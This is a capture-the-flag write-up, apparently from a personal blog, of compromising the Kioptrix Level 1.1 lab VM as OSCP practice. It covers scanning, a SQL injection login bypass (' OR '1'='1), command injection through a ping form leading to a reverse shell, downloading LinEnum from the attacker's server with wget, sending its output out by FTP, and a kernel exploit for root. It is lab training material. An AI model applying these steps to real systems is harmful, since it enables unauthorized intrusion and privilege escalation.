---
layout: post
title: Kioptrix Level 1.1 (#2) Writeup
excerpt: Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get a simple reverse shell. Finally, we successfully privilege escalate to root using a kernel exploit. As with the entire Kioptrix series, this challengs is pretty outdated, and the real-world applicability is questionable, but it's great OSCP prep and learning material.
tags: VulnHub
comments: true
---

Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get a simple reverse shell. Finally, we successfully privilege escalate to root using a kernel exploit. 

Feel free to checkout my writeup on the first box: [Kioptrix 1](https://0xash.github.io/2020-07-27-Kioptrix-Level-1/).

The entire Kioptrix series is good baseline prep for anyone studying for their OSCP/PWK, learning Network pentesting, and trying to get some practice enumerating a box. I would highly recommend it _prior_ to purchasing PWK/OSCP as it will give you a good headstart and allow you to get the most out of your lab time.

I’ll assume you’ve already got the box running and are able to reach it. Let’s get going.

# Enumeration

Let's start by kicking off some NMAP scans.

### NMAP Scans

```bash
Nmap scan report for 10.0.0.35
Host is up (0.00015s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2020-07-29T02:19:53+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
912/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:A0:57:DB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
```

### Enumerating SSH

Alright, so NMAP detected `OpenSSH 3.9p1 (protocol 1.99)`, goolging this version number doesn't reveal anything interesting, so let's note it and move on.


### Enumerating RPC

Let's use `rpcinfo` to see what kind of servies are being run through RPC, maybe some NFS shares are available?

`rpcinfo -p 10.0.0.35`

```bash
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp    909  status
    100024    1   tcp    912  status
```

Hmmm... portmapper looks interesting. Let's do some googling.

`~~~time passes~~~`

Okay, so it looks like there are [cool tricks you can do](https://gracefulsecurity.com/bypass-rpc-portmapper-filtering/), but it requires other services (like `NFS`) to be running on the host. Most likely a dead end, but let's note it and continue.

### Enumerating HTTP/HTTPS

I'll start by running Nikto and ffuf on the web assets at port 80/443

#### Nikto

`nikto -host http://10.0.0.35`

`nikto -host https://10.0.0.35`

Let's take a look at output from the HTTPS scan:

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.35
+ Target Hostname:    10.0.0.35
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
                   Ciphers:  DHE-RSA-AES256-SHA
                   Issuer:   /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+ Start Time:         2020-07-28 20:30:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Hostname '10.0.0.35' does not match certificate's names: localhost.localdomain
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8705 requests: 3 error(s) and 20 item(s) reported on remote host
+ End Time:           2020-07-28 20:42:10 (GMT-4) (692 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Intersting stuff, looks like an outdated version of Apache and some fun HTTP methods. Let's note and come back to this.


#### ffuf

I'll move on to directory brute forcing using `ffuf`.

#### HTTP:
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.0.35/FUZZ`
```

#### HTTPS:

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.0.0.35/FUZZ`
```
Both results only gathered two directories `manual` and `usage`:

```
manual                  [Status: 301, Size: 309, Words: 20, Lines: 10]
usage                   [Status: 403, Size: 283, Words: 21, Lines: 11]
```

These look to be default Apache sub-directories... nothing really interesting. Oh well, let's note and continue on.

### Enumerating CUPS

NMAP detected `CUPS 1.1` on port 631 with some interesting HTTP headers. Weird. Let's start by simply trying to access the service via HTTP with our web browser.

![Trying to access CUPS](/assets/img/VulnHub/Kioptrix1.1_1.PNG)

I'll be honest, I had to google CUPS to get an idea on what the service does... Let's [see...](https://en.wikipedia.org/wiki/CUPS)

Okay, cool! So CUPS is basically a Unix print service.

{: .box-note}
**Note:** Hey! this is me from the future. Although I wasn't aware at this time, `CUPS` is really really useful, and may even come in handy for the OSCP. If you find it running, look into it.

### Enumerating MySQL

NMAP scans for this one came back saying we are unauthorized, but let's quickly confirm:

```bash
ein@~/VulnHub/Kioptrix1.1:$ mysql -h 10.0.0.35
ERROR 1130 (HY000): Host '10.0.0.168' is not allowed to connect to this MySQL server
ein@~/VulnHub/Kioptrix1.1:$ mysql -u root -h 10.0.0.35
ERROR 1130 (HY000): Host '10.0.0.168' is not allowed to connect to this MySQL server
```

Yep, most likely need to come back to this one with credentials.

# Exploitation

Let's go back and start looking through scan results and seeing if there's anything we missed. One thing that stuck out to me is the following Nikto results:

```bash
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
```

Huh, weird. Let's take a look at those URLs.

![Taking a look at the weird PHP URLs](/assets/img/VulnHub/Kioptrix1.1_2.PNG)

Oh cool, so PHP leaks files out somehow via this vulnerability... Interesting, what else? Hmmm.. so it looks like NMAP picked up some weird HTTP headers, let's use CURL to take a look at this "under the hood" without a web browser.

`curl -X GET HTTP://10.0.0.35`

```html
<html>
<body>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
        <table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
                <tr>
                        <td colspan='2' align='center'>
                        <b>Remote System Administration Login</b>
                        </td>
                </tr>
                <tr>
                        <td width="150">Username</td>
                        <td><input name="uname" type="text"></td>
                </tr>
                <tr>
                        <td width="150">Password</td>
                        <td>
                        <input name="psw" type="password">
                        </td>
                </tr>
                <tr>
                        <td colspan="2" align="center">
                        <input type="submit" name="btnLogin" value="Login">
                        </td>
                </tr>
        </table>
</form>

<!-- Start of HTML when logged in as Administator -->
</body>
</html>
```

Wait, what? This isn't the default Apache page we found earlier. Skimming through the HTML, this looks like some sort of login page. 

Let's add /index.php to the URL and see if we can access it.

![Accessing index.php](/assets/img/VulnHub/Kioptrix1.1_3.PNG)

Wow. Sure enough there's a login page. 

At this point I'm not sure why this server was acting the way it was. For whatever reason though, accessing the page via a web browser just shot me over to the default Apache landing page.

Anyways, now we have a login form. I tried some simple combinations like `admin:admin` to no avail. Let's try the most simple low hanging SQLi fruit of username: `root` and password: `' OR '1'='1`. This is taken directly from the [SQL Injection Wikipedia Page](https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_filtered_escape_characters)

![SQL injection attempt](/assets/img/VulnHub/Kioptrix1.1_4.PNG)

And we are successfully authenticated. Maybe we got a little lucky, but what does this give us?

![Admin Console](/assets/img/VulnHub/Kioptrix1.1_5.PNG)

Hmmm.. A stripped down admin console. It looks like it takes an arugment and executes the `ping` command on the host. 

The fact that it likely uses PHP's `system()` or `exec()` is interesting. I wonder if we can simply escape the query and execute code?

![Admin Console](/assets/img/VulnHub/Kioptrix1.1_6.PNG)

Well that was easy... by simply prepending `;` to our input, we can execute uer-defined code. Knowing this, it's trivial to get a reverse shell using a [cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

![Getting our reverse shell](/assets/img/VulnHub/Kioptrix1.1_7.PNG)

# Privilege Escalation

Time to enumerate. Let's start by executing [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to gather information about the host.

I'll download the script and host it on a local HTTP server using Python:

`sudo python -m SimpleHTTPServer 80`

Then on my compromised host:

```bash
cd /tmp
mkdir tmppp
cd tmppp
wget http://<my IP>/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh >> lol.txt
```

The output's a little messy, so let's push `lol.txt` (the results) back to my Kali box using FTP. 

{: .box-warning}
**Note:** if you're on a busy network with other people (i.e. HackTheBox networks) you'll want to utilize an alternate method to transfer files. Since this is a home lab FTP is suitable.

#### Pushing the LinEnum output using FTP:

```bash
ftp <my IP>
Name: ...
Password: ...
put lol.txt
```

After reviewing, the first thing I notice is the Kernel version:

`Linux kioptrix.level2 2.6.9-55.EL`

Which is really old. Also it looks like we have `gcc` installed on the box.

```bash
which gcc
/bin/gcc
```


....hmmmm...Let's [google](https://www.exploit-db.com/exploits/9542).

And there looks to be a suitable kernel exploit. Okay, let's try it out.

I'll first download the exploit and rename it to a gcc-friendly `.c` file name:

```bash
ein@~/VulnHub/Kioptrix1.1:$ wget https://www.exploit-db.com/download/9542
mv 9542 exploit.c
```

Now let's migrate it to the compromised host using FTP again:

```bash
get exploit.c
local: exploit.c remote: exploit.c
227 Entering Passive Mode (10,0,0,168,165,104)
150 Accepted data connection
226-File successfully transferred
226 0.000 seconds (measured here), 29.97 Mbytes per second
2645 bytes received in 0.000125 secs (2.1e+04 Kbytes/sec)
ftp> exit
exit
221-Goodbye. You uploaded 32 and downloaded 3 kbytes.
221 Logout.
bash-3.00$ ls
ls
exploit.c  LinEnum.sh  lol.txt
```

Sweet, now let's simply compile and run the exploit using `gcc`.

![Root!](/assets/img/VulnHub/Kioptrix1.1_8.PNG)

And we successfully privilege escalated and spawned a root shell. Rooted!
